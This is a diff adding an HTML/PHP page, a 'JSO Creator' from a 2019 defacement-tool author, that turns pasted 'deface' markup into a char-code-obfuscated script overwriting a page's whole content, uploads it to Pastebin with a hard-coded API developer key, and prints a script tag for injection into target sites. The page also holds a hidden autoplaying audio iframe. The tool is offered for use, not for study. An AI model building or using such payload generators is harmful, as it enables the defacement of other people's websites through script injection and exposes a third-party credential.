@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+
+<link href="https://i.postimg.cc/tRMBxPQF/Ic-Setting-Profile.png" rel="icon" type="image/x-icon"/>
+
+<link href="https://fonts.googleapis.com/css?family=Homenaje" rel="stylesheet" type="text/css">
+
+<style>
+
+body{
+
+background-color: #000d2a;
+
+background-image:url(https://i.pinimg.com/originals/f4/52/a2/f452a2f4b634b3011e065da8eaf0a5c3.gif);
+
+background-size: cover;
+
+background-attachment: fixed; 
+
+text-align: center;
+
+font-face: homenaje;
+
+}
+
+</style>
+
+<html>
+
+<head>
+
+    <title>Script JSO Creator</title>
+
+<script>alert('~[ Welcome To My Tools ]~')</script>
+
+<script>alert('~[ Convert dulu.. Baru abis itu Create yaa sterr.. ]~')</script>
+
+<font face="homenaje" size="20" color="#02BC8C">[+]</font><u><font face="homenaje" size="20" color="white">Welcome To My Tools</font></u><font face="homenaje" size="20" color="#02BC8C">[+]</u><br><br>
+
+<br>
+
+<font face="homenaje" size="10" color="#02BC8C">[+]</font><u><font face="homenaje" size="10" color="white">JSO Creator Online By ZEEXCYTECH</font></u><font face="homenaje" size="10" color="#02BC8C">[+]</u><br><br>
+
+    <script>
+
+        function runCharCodeAt() {
+
+            input = document.charCodeAt.input.value;
+
+            output = "";
+
+            for(i=0; i<input.length; ++i) {
+
+                if (output != "") output += ", ";
+
+                output += input.charCodeAt(i);
+
+            }
+
+            document.charCodeAt.output.value = output;
+
+        }
+
+    </script>
+
+</head>
+
+<body>
+
+<center>
+
+    <form name="charCodeAt" method="post">
+
+        <textarea name="input" style="width: 400px;height: 200px;" placeholder="Script Deface Klean eaa"></textarea><br><br>
+
+        <input type="button" onclick="runCharCodeAt()" value="Convert"><br><br>
+
+        <textarea name="output" style="width: 400px;height: 200px;"></textarea><br><br>
+
+        <input type="submit" name="submit" value="Create Mank!!">
+
+    </form>
+
+    <br><br>
+
+<?php
+
+ 
+
+if (isset($_POST['submit'])) {
+
+    if (empty($_POST['output'])) {
+
+        echo "<script>alert('Convert Dulu Mhanx');</script>";
+
+    } else {
+
+$isi = $_POST['output'];
+
+$random = rand(1, 99999999);
+
+$api_dev_key            = '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
+
+$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
+
+$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
+
+$api_paste_name         = $random; // name or title of your paste
+
+$api_paste_expire_date      = 'N';
+
+$api_paste_format       = 'text';
+
+$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
+
+$api_paste_name         = urlencode($api_paste_name);
+
+$api_paste_code         = urlencode($api_paste_code);
+
+ 
+
+$url                = 'https://pastebin.com/api/api_post.php';
+
+$ch                 = curl_init($url);
+
+ 
+
+curl_setopt($ch, CURLOPT_POST, true);
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+curl_setopt($ch, CURLOPT_VERBOSE, 1);
+
+curl_setopt($ch, CURLOPT_NOBODY, 0);
+
+ 
+
+$response           = curl_exec($ch);
+
+$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
+
+$asu = '<script type="text/javascript" src="'.$hasil.'"></script>';
+
+$kk = htmlspecialchars($asu);
+
+echo $kk;
+
+}
+
+}
+
+ 
+
+ ?>
+
+ </center>
+
+</body>
+
+<iframe width="0" height="0" src="https://k.top4top.net/m_1418y4pm40.mp3" frameborder="0" allowfullscreen></iframe>
+
+</html>
+
+<hr>
+
+<div class="foot">
+
+Copyleft &#169; 2019<br>
+
+<small>zeexcytech</small>
+
+</div>
+
+</body>
+
+</html>
+
